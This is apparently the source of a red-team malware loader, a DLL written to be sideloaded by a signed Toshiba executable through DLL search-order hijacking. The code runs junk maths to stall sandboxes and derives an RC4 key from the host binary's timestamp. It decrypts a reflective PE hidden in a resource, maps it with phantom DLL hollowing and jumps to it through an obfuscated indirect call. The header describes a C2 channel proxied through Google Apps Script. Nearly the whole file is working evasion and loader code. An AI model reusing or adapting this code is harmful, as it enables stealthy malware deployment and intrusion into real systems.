/*
   Author: @BorjaMerino
   Version: 0.1 (stripped)
   Description:
   Taking advantage of a legitimate binary vulnerable to "DLL Search Order Hijacking" (TosBtKbd.exe, signed by TOSHIBA)
   a harmful DLL (TOSBTKBD.dll) is loaded. The DLL loads and decrypts a reflective PE binary stored in a resource
   using as key (RC4) the timestamp of the main binary (TosBtKbd.exe). The embedded binary communicates with the C2
   using the Google Script service as a proxy (as an alternative to domain-fronting). This code will be executed using
   "Phantom DLL Hollowing" by means of the technique described by Forrest Orr. Likewise and before decrypting the main
   exe the payload it runs some "junk code" for a while (certain mathematical operations to calculate decimals) to try
   to distract the sandbox.

   TTPs references: 
   https://st.drweb.com/static/new-www/news/2020/october/Study_of_the_ShadowPad_APT_backdoor_and_its_relation_to_PlugX_en.pdf
   https://github.com/forrest-orr/phantom-dll-hollower-poc
   https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control
*/

#include "pch.h"
#include <math.h>
#include <stdlib.h> 
#include <conio.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>
#include "resource.h"
#include "header.h"

bool bTxF = false;


#define ENCRYPT_ALGORITHM   CALG_RC4
#define ENCRYPT_BLOCK_SIZE  1
#define KEYLENGTH 0x00800000

//Changeme
#define PSIZE 2500
#define FSIZE 1000
#define TSIZE 10

char line[FSIZE];
char varname[TSIZE];
char varvalue[FSIZE];
const PCHAR pos = varvalue;
unsigned char payload[PSIZE];

//Useful: https://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
static PCHAR rand_string(PCHAR str, size_t size)
{
	const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...";
	if (size) {
		--size;
		for (size_t n = 0; n < size; n++) {
			int key = rand() % (int)(sizeof charset - 1);
			str[n] = charset[key];
		}
		str[size] = '\0';
	}
	return str;
}


void error()
{
	MessageBox(0, L"Testing", L"ERROR", 0);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

double c(int num1) { return (16 / (num1 * pow(5.0, num1 * 1.0))); }
double c1(int num1) { return (4 / (num1 * pow(249.0, num1 * 1.0))); }

void stale()
{
	// Stale code. Play with the "limit" var to look for a delay you feel happy with 
	double limit = 100;
	int j = 0;
	double ans1 = 0.0;
	double ans2 = 0.0;
	int flag = 1;

	for (j = 1; j <= limit; j += 1) {
		if (flag == 1) {
			ans1 += c(j);
			ans2 += c1(j);
			flag = 0;
		}
		else {
			ans1 -= c(j);
			ans2 -= c1(j);
			flag = 1;
		}
	}
	printf("%f", ans1);
}

//Useful: https://stackoverflow.com/questions/35540446/get-current-nt-header-data-of-running-process-with-c-c
DWORD getKey()
{
	IMAGE_DOS_HEADER dosHeader = { 0 };
	IMAGE_NT_HEADERS ntHeader = { 0 };
	MODULEENTRY32 moduleEntry;
	PVOID baseAddress = NULL;

	HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	moduleEntry.dwSize = sizeof(moduleEntry);

	if (Module32First(hModule, &moduleEntry)) baseAddress = moduleEntry.modBaseAddr;
	CloseHandle(hModule);
	
	ReadProcessMemory(GetCurrentProcess(), baseAddress, &dosHeader, sizeof(IMAGE_DOS_HEADER), 0);
	ReadProcessMemory(GetCurrentProcess(), (void*)((unsigned long)baseAddress + dosHeader.e_lfanew), &ntHeader, sizeof(IMAGE_NT_HEADERS), 0);

	if (ntHeader.Signature == IMAGE_NT_SIGNATURE) return ntHeader.FileHeader.TimeDateStamp;

	return NULL;
}

PCHAR getResource(DWORD* len)
{
	HINSTANCE mHandle = LoadLibrary(L"TOSBTKBD.dll");
	HRSRC shellRes = FindResource(mHandle, MAKEINTRESOURCE(IDR_ICONO1), L"icono");
	if (shellRes != NULL)
		{
			DWORD shellSize = SizeofResource(mHandle, shellRes);
			*len = shellSize;
			HGLOBAL resData = LoadResource(mHandle, shellRes);
			if (resData != NULL)
			{
				void* exec = VirtualAlloc(0, shellSize, MEM_COMMIT, PAGE_READWRITE);
				if (exec != NULL)
				{
					memcpy(exec, resData, shellSize);
					return (PCHAR)exec;
				}
			}
		}
	return NULL;
}

void decrypt(PCHAR key, PVOID resource, PDWORD dwCount)
{
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	HCRYPTKEY hKey = 0;


	//CryptAcquireContext(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0);
	if (!(CryptAcquireContext(&hProv,	NULL, NULL,	PROV_RSA_FULL, 0)))
	{
		if (GetLastError() == NTE_BAD_KEYSET)
		{
			CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET);
		}
	}

	//no error checks ¯\_(ツ)_/¯
	CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash);
	CryptHashData(hHash, (PBYTE)key, (DWORD)strlen(key), 0);
	CryptDeriveKey(hProv, ENCRYPT_ALGORITHM, hHash, KEYLENGTH, &hKey);
	CryptDestroyHash(hHash);
	hHash = 0;
	CryptDecrypt(hKey, 0, TRUE, 0, (PBYTE)resource, dwCount);

}

//#include "syscalls.h" //SysWhispers
void __stdcall UnHookTosBtKbd(void) {}
void __stdcall SetTosBtKbdHook(void)
{
	char key[11];
	stale();

	//Get RC4 Key (TimeDateStamp DWORD value)
	DWORD ts = getKey();
	if (ts == NULL) return;

	sprintf_s(key, "%X", ts);
	DWORD dwCount;

	//Get encrypted shellcode from resource
	PCHAR exec = getResource(&dwCount);
	if (exec != NULL)
	{
		//Decrypt shellcode
		decrypt(key, exec, &dwCount);

		//Lazy check (reflective loading stub)
		if ((exec[1] == 'Z') && (exec[2] == 'E'))
		{
			uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
			uint64_t qwMapBufSize;

			//Phantom DLL hollowing
			//Ref: github.com/forrest-orr/phantom-dll-hollower-poc
			//bTxF <-- (check NtCreateTransaction on the system)
			if (HollowDLL(&pMapBuf, &qwMapBufSize, (const uint8_t*)exec, dwCount, &pMappedCode, bTxF)) {
				VirtualFree(exec, NULL, MEM_RELEASE);

				//Less obvious indirect call
				__asm
				{
					mov eax, pMappedCode
					push eax;
					ret
				}
			}
		}
	}
}


